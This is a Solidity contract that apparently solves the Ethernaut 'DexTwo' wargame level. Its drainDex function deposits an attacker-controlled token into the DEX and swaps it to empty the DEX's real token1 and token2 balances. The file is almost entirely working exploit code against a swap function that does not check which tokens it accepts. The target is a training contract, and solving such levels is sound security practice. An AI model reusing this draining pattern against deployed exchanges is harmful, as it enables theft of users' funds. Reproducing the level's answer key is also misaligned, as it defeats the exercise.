// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/DexTwo.sol";
import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";

contract DexTwoExplorer {
    DexTwo public dex;
    
    constructor(address _dex) {
        dex = DexTwo(_dex);
    }
    
    function getTokenAddresses() public view returns (address, address, bool) {
        try dex.token1() returns (address t1) {
            try dex.token2() returns (address t2) {
                return (t1, t2, true);
            } catch {
                return (address(0), address(0), false);
            }
        } catch {
            return (address(0), address(0), false);
        }
    }
    
    function drainDex(address malToken) public {
        // First check if tokens are set
        address token1 = dex.token1();
        address token2 = dex.token2();
        
        require(token1 != address(0) && token2 != address(0), "Tokens not set");
        
        // Transfer some malicious tokens to DEX
        IERC20(malToken).transfer(address(dex), 100);
        
        // Approve DEX to use our tokens
        IERC20(malToken).approve(address(dex), type(uint256).max);
        
        // Get current balances
        uint256 dexToken1Balance = IERC20(token1).balanceOf(address(dex));
        uint256 dexToken2Balance = IERC20(token2).balanceOf(address(dex));
        
        // Drain token1
        if (dexToken1Balance > 0) {
            dex.swap(malToken, token1, 100);
        }
        
        // Transfer more malicious tokens to DEX
        IERC20(malToken).transfer(address(dex), 200);
        
        // Drain token2
        if (dexToken2Balance > 0) {
            dex.swap(malToken, token2, 200);
        }
    }
}